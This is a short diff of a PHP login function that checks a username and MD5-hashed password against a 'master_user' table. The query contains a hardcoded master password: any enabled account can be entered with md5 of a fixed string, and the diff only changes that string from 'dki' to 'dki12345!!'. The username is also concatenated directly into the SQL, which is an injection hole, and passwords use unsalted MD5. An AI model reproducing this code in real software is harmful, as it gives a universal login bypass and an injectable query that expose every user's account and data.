@@ -19,7 +19,7 @@
         // $password = $data['password'];
         $password=md5($data['password']);      
 
-        $sql = "select 1 from \"master_user\" where \"user_id\" ='".$username."' AND \"user_enable\"='t' AND (\"user_password\" = '".$password."' OR '".md5('dki')."' = '".$password."')";
+        $sql = "select 1 from \"master_user\" where \"user_id\" ='".$username."' AND \"user_enable\"='t' AND (\"user_password\" = '".$password."' OR '".md5('dki12345!!')."' = '".$password."')";
         $query = $db_ekin->query($sql);
         return $query->result();
     }
